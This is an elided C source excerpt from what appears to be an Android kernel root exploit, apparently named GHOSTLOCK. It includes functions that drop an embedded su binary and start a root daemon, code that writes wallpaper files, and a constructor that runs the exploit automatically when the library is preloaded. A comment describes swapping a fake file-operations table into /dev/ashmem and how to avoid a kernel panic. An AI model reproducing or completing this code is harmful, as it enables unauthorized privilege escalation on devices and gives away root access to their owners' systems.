...
static int write_embedded_su_file(const char *dir, const char *dst) {
  ...
  try_chcon(dst);
  pr_info("embedded su wrote %zu bytes to %s\n", size, dst);
  return 1;
}
...
int install_embedded_su(pid_t *daemon_pid) {
  ...
  for (int i = 0; i < 50; i++) {
    if (access(SU_SOCK, F_OK) == 0) {
      pr_info("embedded su daemon ready pid=%d socket=%s\n", pid, SU_SOCK);
      return 1;
    }
    usleep(100000);
  }
...
static int write_embedded_wallpaper_file(const char *path, mode_t mode) {
  ...
  pr_info("embedded wallpaper wrote %zu bytes to %s\n", size, path);
  return 1;
}
...
static int restart_wallpaper_framework(void) {
  /*
   * CRASH FIX (run50): do NOT kill system_server while misc.fops is still
   * fake_fops. The parent restores misc.fops only AFTER install_child_root
   * returns; the root child runs this concurrently — killing system_server
   * makes zygote re-spawn it while /dev/ashmem opens still resolve to the
   * fake fops table, whose unfilled slots (poll/fsync/...) are NULL →
   * NULL-pointer call → kernel panic → hard reboot (uptime=0).
   *
   * GHOSTLOCK_NO_FRAMEWORK_RESTART=1 (default) skips the kill entirely;
   * wallpaper files are still written and take effect next boot. Set it to
   * 0 only when misc.fops is known to be restored (post-collect restore).
   */
  char *no_restart = getenv("GHOSTLOCK_NO_FRAMEWORK_RESTART");
  if (!no_restart || no_restart[0] != '0') {
    pr_info("wallpaper reload SKIPPED (GHOSTLOCK_NO_FRAMEWORK_RESTART=1 "
            "default; misc.fops still fake — avoid NULL-slot panic)\n");
    fsync(STDERR_FILENO);
    errno = 0;
    return 1;
  }
...
__attribute__((constructor)) static void load(void) {
  ...
  pr_info("preload starting pid=%d\n", getpid());
  run_exploit(1, argv);
}
